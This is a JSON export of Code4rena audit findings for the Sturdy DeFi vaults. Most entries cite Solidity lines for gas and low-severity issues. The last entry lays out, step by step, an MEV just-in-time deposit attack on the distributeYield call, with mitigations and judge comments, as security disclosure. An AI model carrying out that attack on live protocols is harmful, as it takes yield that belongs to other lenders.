      "impact": "GAS",
      "content": "\nNot inlining costs 20 to 40 gas because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 6 instances of this issue:*\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol\n\n205:    function _processTreasury(address _asset, uint256 _yieldAmount) internal returns (uint256) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L205>\n\n```solidity\nFile: smart-contracts/LidoVault.sol\n\n154:    function _processTreasury(uint256 _yieldAmount) internal returns (uint256) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L154>\n\n```solidity\nFile: smart-contracts/YieldManager.sol\n\n142:    function _getAssetYields(uint256 _totalYieldAmount) internal view returns (AssetYield[] memory) {\n\n178:    function _convertAssetToExchangeToken(address asset, uint256 amount) internal {\n\n195     function _convertToStableCoin(address _tokenOut, uint256 _amount)\n196       internal\n197:      returns (uint256 receivedAmount)\n\n219:    function _depositYield(address _asset, uint256 _amount) internal {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L142>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-05-internal-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5434",
      "title": "[L-08] Missing checks for `address(0x0)` when assigning values to `address` state variables",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol   #1\n\n41:       curveLPToken = _lpToken;\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L41\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#l-08-missing-checks-for-address0x0-when-assigning-values-to-address-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "5433",
      "title": "[L-07] `safeApprove()` is deprecated",
      "impact": "LOW",
      "content": "[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead\n\n*There are 3 instances of this issue:*\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol   #1\n\n141:      IERC20(curveLPToken).safeApprove(convexBooster, _amount);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L141\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol   #2\n\n146:      IERC20(internalAssetToken).safeApprove(address(_addressesProvider.getLendingPool()), _amount);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L146\n\n```solidity\nFile: smart-contracts/LidoVault.sol   #3\n\n102:      IERC20(LIDO).safeApprove(address(_addressesProvider.getLendingPool()), assetAmount);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L102\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#l-07-safeapprove-is-deprecated",
      "tags": [],
      "finders": []
    },
    {
      "id": "5432",
      "title": "[L-03] Missing checks for `approve()`'s return status",
      "impact": "LOW",
      "content": "Some tokens, such as Tether (USDT) return false rather than reverting if the approval fails. Use OpenZeppelin's `safeApprove()`, which reverts if there's a failure, instead\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/YieldManager.sol   #1\n\n221:     IERC20(_asset).approve(_lendingPool, _amount);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L221\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#l-03-missing-checks-for-approves-return-status",
      "tags": [],
      "finders": []
    },
    {
      "id": "4709",
      "title": "[G-16] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are<br>\n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost\n\n*There are 9 instances of this issue:*\n\n```solidity\nFile: smart-contracts/CollateralAdapter.sol\n\n43      function addCollateralAsset(\n44        address _externalAsset,\n45        address _internalAsset,\n46        address _acceptVault\n47:     ) external onlyAdmin {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/CollateralAdapter.sol#L43-L47>\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol\n\n37:     function setConfiguration(address _lpToken, uint256 _poolId) external onlyAdmin {\n\n87:     function processYield() external override onlyAdmin {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L37>\n\n```solidity\nFile: smart-contracts/GeneralVault.sol\n\n165:    function setTreasuryInfo(address _treasury, uint256 _fee) external onlyAdmin {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L165>\n\n```solidity\nFile: smart-contracts/LidoVault.sol\n\n30:     function processYield() external override onlyAdmin {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L30>\n\n```solidity\nFile: smart-contracts/YieldManager.sol\n\n64:     function setExchangeToken(address _token) external onlyAdmin {\n\n73:     function registerAsset(address _asset) external onlyAdmin {\n\n92      function setCurvePool(\n93        address _tokenIn,\n94        address _tokenOut,\n95        address _pool\n96:     ) external onlyAdmin {\n\n118:    function distributeYield(uint256 _offset, uint256 _count) external onlyAdmin {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L64>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-16-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4708",
      "title": "[G-15] Empty blocks should be removed or emit something",
      "impact": "GAS",
      "content": "\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)\n\n*There are 6 instances of this issue:*\n\n```solidity\nFile: smart-contracts/GeneralVault.sol\n\n153:    function processYield() external virtual {}\n\n158:    function pricePerShare() external view virtual returns (uint256) {}\n\n246:    {}\n\n255:    ) internal virtual returns (uint256) {}\n\n265:    {}\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L153>\n\n```solidity\nFile: smart-contracts/LidoVault.sol\n\n24:     receive() external payable {}\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L24>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-15-empty-blocks-should-be-removed-or-emit-something",
      "tags": [],
      "finders": []
    },
    {
      "id": "4707",
      "title": "[G-14] Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nSaves deployment costs\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol   #1\n\n101:      require(_token == _tokenFromConvex, Errors.VT_INVALID_CONFIGURATION);\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L101>\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #2\n\n203:      require(_pool != address(0), Errors.VT_INVALID_CONFIGURATION);\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L203>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-14-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4703",
      "title": "[G-10] It costs more gas to initialize variables to zero than to let the default of zero be applied",
      "impact": "GAS",
      "content": "\n*There are 5 instances of this issue:*\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol\n\n106:      for (uint256 i = 0; i < extraRewardsLength; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L106>\n\n```solidity\nFile: smart-contracts/GeneralVault.sol\n\n218:      for (uint256 i = 0; i < length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L218>\n\n```solidity\nFile: smart-contracts/YieldManager.sol\n\n120:      for (uint256 i = 0; i < _count; i++) {\n\n130:      for (uint256 i = 0; i < assetYields.length; i++) {\n\n156:      for (uint256 i = 0; i < length; i++) {\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L120>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-10-it-costs-more-gas-to-initialize-variables-to-zero-than-to-let-the-default-of-zero-be-applied",
      "tags": [],
      "finders": []
    },
    {
      "id": "4701",
      "title": "[G-08] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "\nUse a solidity version of at least 0.8.0 to get overflow protection without `SafeMath`<br>\nUse a solidity version of at least 0.8.2 to get compiler automatic inlining<br>\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads<br>\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings<br>\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value<br>\n\n*There are 5 instances of this issue:*\n\n```solidity\nFile: smart-contracts/CollateralAdapter.sol\n\n2:    pragma solidity 0.6.12;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/CollateralAdapter.sol#L2>\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol\n\n2:    pragma solidity 0.6.12;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L2>\n\n```solidity\nFile: smart-contracts/GeneralVault.sol\n\n2:    pragma solidity 0.6.12;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L2>\n\n```solidity\nFile: smart-contracts/LidoVault.sol\n\n2:    pragma solidity 0.6.12;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L2>\n\n```solidity\nFile: smart-contracts/YieldManager.sol\n\n2:    pragma solidity 0.6.12;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L2>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-08-use-a-more-recent-version-of-solidity",
      "tags": [],
      "finders": []
    },
    {
      "id": "4700",
      "title": "[G-07] Not using the named return variables when a function returns, wastes deployment gas",
      "impact": "GAS",
      "content": "\n*There is 1 instance of this issue:*\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #1\n\n200:        return _amount;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L200>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-07-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4697",
      "title": "[G-04] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a state variable within a function. Caching will replace each Gwarmaccess (100 gas) with a much cheaper stack read.<br>\nLess obvious fixes/optimizations include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 7 instances of this issue:*\n\n```solidity\nFile: smart-contracts/ConvexCurveLPVault.sol\n\n/// @audit convexBooster\n142:      IConvexBooster(convexBooster).deposit(convexPoolId, _amount, true);\n\n/// @audit curveLPToken\n138:      TransferHelper.safeTransferFrom(curveLPToken, msg.sender, address(this), _amount);\n\n/// @audit curveLPToken\n141:      IERC20(curveLPToken).safeApprove(convexBooster, _amount);\n\n/// @audit internalAssetToken\n146:      IERC20(internalAssetToken).safeApprove(address(_addressesProvider.getLendingPool()), _amount);\n\n/// @audit internalAssetToken\n148:      return (internalAssetToken, _amount);\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/ConvexCurveLPVault.sol#L142>\n\n```solidity\nFile: smart-contracts/YieldManager.sol\n\n/// @audit _exchangeToken\n202:      address _pool = _curvePools[_exchangeToken][_tokenOut];\n\n/// @audit _exchangeToken\n207:        _exchangeToken,\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L202>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-04-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "4696",
      "title": "[G-03] Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: smart-contracts/CollateralAdapter.sol   #1\n\n27      mapping(address => address) internal _assetToVaults;\n28      // External collateral asset -> internal collateral asset\n29:     mapping(address => address) internal _collateralAssets;\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/CollateralAdapter.sol#L27-L29>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-03-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate",
      "tags": [],
      "finders": []
    },
    {
      "id": "4695",
      "title": "[G-02] Add an `unregisterAsset()` function",
      "impact": "GAS",
      "content": "\nBy unregistering and setting a mapping field to `0`, you'll be getting a Gsreset gas refund (2900 gas). If most `registerAsset()` calls are paired with `unregisterAsset()` calls, transactions will be cheaper\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: smart-contracts/YieldManager.sol   #1\n\n73     function registerAsset(address _asset) external onlyAdmin {\n74       _assetsList[_assetsCount] = _asset;\n75       _assetsCount = _assetsCount + 1;\n76:    }\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L73-L76>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-02-add-an-unregisterasset-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4694",
      "title": "[G-01] Add `require()` for asset address checks before doing the exchange",
      "impact": "GAS",
      "content": "\nThe code below should verify that the address is either `0x0` or the LIDO address, in order to prevent wasting gas by doing all of the operations between this point and the actual check done in `_depositToYieldPool()`\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: smart-contracts/LidoVault.sol   #1\n\n109    function _getWithdrawalAmount(address _asset, uint256 _amount)\n110      internal\n111      view\n112      override\n113      returns (address, uint256)\n114    {\n115      // In this vault, return same amount of asset.\n116      return (_addressesProvider.getAddress('LIDO'), _amount);\n117:   }\n```\n\n<https://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L109-L117>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#g-01-add-require-for-asset-address-checks-before-doing-the-exchange",
      "tags": [],
      "finders": []
    },
    {
      "id": "4693",
      "title": "[L-09] Open TODOs",
      "impact": "LOW",
      "content": "Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n77:       // Ex: if user deposit 100ETH, this will deposit 100ETH to Lido and receive 100stETH TODO No Lido\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L77\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#l-09-open-todos",
      "tags": [],
      "finders": []
    },
    {
      "id": "4690",
      "title": "[L-06] Unused `receive()` function will lock Ether in contract",
      "impact": "LOW",
      "content": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/LidoVault.sol   #1\n\n24:     receive() external payable {}\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/LidoVault.sol#L24\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#l-06-unused-receive-function-will-lock-ether-in-contract",
      "tags": [],
      "finders": []
    },
    {
      "id": "4689",
      "title": "[L-05] Unsafe casts and usage of `IERC20Detailed`",
      "impact": "LOW",
      "content": "The `GeneralVault` is meant to be general, i.e. not specific to Lido or Curve, and therefore should not assume that the asset will always be `IERC20Detailed` (not all ERC20 contracts define `decimals()` since it's optional in the spec). Use [`safeDecimals()`](https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L33-L55) instead\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n122:       uint256 decimal = IERC20Detailed(_asset).decimals();\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L122\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#l-05-unsafe-casts-and-usage-of-ierc20detailed",
      "tags": [],
      "finders": []
    },
    {
      "id": "4688",
      "title": "[L-04] Move `ETH` constant to child contract",
      "impact": "LOW",
      "content": "All of the functions in the `GeneralVault` require `0x0` when referring to Ether, not the constant here. Having it here will lead to mistakes down the line. It's only used by `CurveswapAdapter`, so it only needs to be there (it currently is also defined there).\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/GeneralVault.sol   #1\n\n47:    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/GeneralVault.sol#L47\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#l-04-move-eth-constant-to-child-contract",
      "tags": [],
      "finders": []
    },
    {
      "id": "4686",
      "title": "[L-02] Can’t remove old assets",
      "impact": "LOW",
      "content": "There is no way to remove old assets added by calls to `registerAsset()`. A disgruntled admin, before their access is revoked, can add a lot of assets and regularly sprinkle them with dust, so the new admins have to submit multiple calls to `distributeYield()` with different offsets and counts, to avoid the dust and possible reversion due to running out of gas\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: smart-contracts/YieldManager.sol   #1\r\n\r\n118    function distributeYield(uint256 _offset, uint256 _count) external onlyAdmin {\r\n119      // 1. convert from asset to exchange token via uniswap\r\n120      for (uint256 i = 0; i < _count; i++) {\r\n121        address asset = _assetsList[_offset + i];\r\n122        require(asset != address(0), Errors.UL_INVALID_INDEX);\r\n123        uint256 _amount = IERC20Detailed(asset).balanceOf(address(this));\r\n124        _convertAssetToExchangeToken(asset, _amount);\r\n125:     }\r\n```\r\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L118-L125",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "4685",
      "title": "[L-01] Mistaken null values cause `distributeYield()` to revert",
      "impact": "LOW",
      "content": "There are no null checks in the `registerAsset()` function, so admins can mistakenly pass 0x0 to that function, which will cause the for-loop to revert when that asset is reached. I've marked this as 'Low' rather than 'Medium' since the admin can work around it by using the `_offset` and `_count` input arguments to the function.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: smart-contracts/YieldManager.sol   #1\n\n118    function distributeYield(uint256 _offset, uint256 _count) external onlyAdmin {\n119      // 1. convert from asset to exchange token via uniswap\n120      for (uint256 i = 0; i < _count; i++) {\n121        address asset = _assetsList[_offset + i];\n122:       require(asset != address(0), Errors.UL_INVALID_INDEX);\n```\nhttps://github.com/code-423n4/2022-05-sturdy/blob/78f51a7a74ebe8adfd055bdbaedfddc05632566f/smart-contracts/YieldManager.sol#L118-L122\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sturdy",
      "source_link": "https://code4rena.com/reports/2022-05-sturdy",
      "github_link": "#l-01-mistaken-null-values-cause-distributeyield-to-revert",
      "tags": [],
      "finders": []
    },
    {
      "id": "2339",
      "title": "[M-06] Yield can be unfairly divided because of MEV/Just-in-time stablecoin deposits",
      "impact": "MEDIUM",
      "content": "_Submitted by mtz, also found by 0x52, hyh, jonah1005, leastwood, and sorrynotsorry_\n\n[YieldManager.sol#L129-L134](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L129-L134)<br>\n[YieldManager.sol#L160-L161](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L160-L161)<br>\n\nAn attacker can use MEV (via gas auction or Flashbots or control of miners) to cause an unfair division of yield. By providing a very large (relative to the size of all other stablecoin deposits combined) stablecoin deposit Just-in-Time before an admin's call to [distributeYield](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L118) the stablecoin deposited by the attacker will receive a very large amount of the yield and the attacker can immediately withdraw their deposit after yield is distributed. We assume this allows an attacker to get a lot of the yield reward even though they haven't provided any deposit that has been borrowed. However, the exact mechanism for how yield is distributed to lenders of a particular stablecoin is in LendingPool.sol, which is out of scope. However it is implied in [the documentation of this repo](https://github.com/code-423n4/2022-05-sturdy/blob/main/README.md?plain=1#L52) that it is based on the balance of that asset the lender has provided. We have confirmed that [in LendingPool.sol the yield is distributed based on the proportion of the asset provided](https://github.com/sturdyfi/code4rena-may-2022/blob/d53f4f5f0b7b33a66e0081294be6117f6d6e17b4/contracts/protocol/lendingpool/LendingPool.sol#L182). However, even ignoring this, MEV can still be used to unfairly hurt lenders of other stablecoins.\n\n### Proof of Concept\n\n1.  An attacker watches the mempool for calls to [distributeYield](https://github.com/code-423n4/2022-05-sturdy/blob/main/smart-contracts/YieldManager.sol#L118) by the admin.\n2.  The attacker orders the block's transactions (most easily using a flashbots bundle) in the following order:<br>\n    i. Attacker deposits stablecoins to lend (ideally the stablecoin will be the one with the least volume).<br>\n    ii. admin's call to distributeYield happens.<br>\n    iii. Attacker withdraws their deposit.<br>\n\nThe attacker has thus made the asset they deposited (and thus themselves) receive much of the yield even though they provide no value to Sturdy since none of their deposit is ever borrowed so the never do anything to earn yield for sturdy.\nThis attack can be done by a whale or by borrowing (even from sturdy) assets and converting them to a stablecoins accepted by sturdy before i. and returning them after iii. This will essentially be cost free for the attacker, none of their capital will ever be tied up by borrowers.\n\n### Recommended Mitigation Steps\n\nThe simplest way to mitigate this is for the admin to use flashbots or some other means of submitting the distributeYield call that skips the mempool. This is only a partial mitigation since attackers can still withdraw right after yield is distributed and get lucky by depositing soon before the distribution thus still capture more yield than they should have.<br>\nA better mitigation could use something like snapshotting who has deposited since the last yield distribution and only give these depositers yield based on the size of their deposits the next time yield is distributed.\n\n**[sforman2000 (Sturdy) confirmed and commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/61#issuecomment-1129546404):**\n > We will use flashbots and vary when/how often yield is harvested to mitigate this.\n\n**[hickuphh3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-05-sturdy-findings/issues/61#issuecomment-1145681249):**\n > I take reference to discussions on Discord and in a thread below:\n> https://github.com/code-423n4/2022-03-biconomy-findings/issues/135\n> \n> To quote from 0xleastwood: \"Protocol leaked value in has a broad context but I think most judges can agree that it would pertain to rewards being paid out a lower rate than expected. Or, users can extract small amounts (up to debate on what is considered to be small) from the protocol under certain assumptions.\" \n> \n> Hence, as per the TLDR risk assessment: <br>\n> `2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`\n> \n> I would downgrade this to a medium severity.\n\n\n\n***\n\n",
